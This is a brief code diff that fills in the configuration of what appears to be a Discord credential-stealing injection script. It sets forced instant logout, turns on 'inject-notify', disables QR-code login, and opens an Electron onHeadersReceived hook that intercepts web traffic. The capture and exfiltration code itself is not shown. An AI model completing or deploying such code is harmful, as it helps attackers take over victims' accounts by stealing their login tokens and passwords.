@@ -20,11 +20,12 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
-    "embed-color": 3447704,
-    "disable-qr-code":"%DISABLEQRCODE%"
+    "logout": "instant",
+    "inject-notify": "true",
+    "logout-notify": "true",
+    "init-notify": "false",
+    "embed-color": 000000,
+    "disable-qr-code": "true"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
